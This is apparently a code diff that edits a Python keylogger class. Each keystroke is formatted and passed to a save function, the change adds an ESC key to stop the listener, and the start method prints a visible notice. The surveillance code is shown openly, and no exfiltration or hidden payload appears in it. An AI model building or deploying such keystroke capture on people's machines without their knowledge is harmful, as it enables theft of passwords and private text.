@@ -7,12 +7,12 @@ class KeyLogger:
         self.listener = keyboard.Listener(on_press=self.on_key_press)
 
     def on_key_press(self, key):
-        """Callback when a key is pressed."""
         key_str = format_key(key)
         save_keystroke(key_str)
+        if key == keyboard.Key.esc:
+            return False
 
     def start(self):
-        """Start the keylogger listener."""
         print("[*] Keylogger started. Press ESC to stop.")
-        with self.listener as listener:
-            listener.join()
+        self.listener.start()
+        self.listener.join()
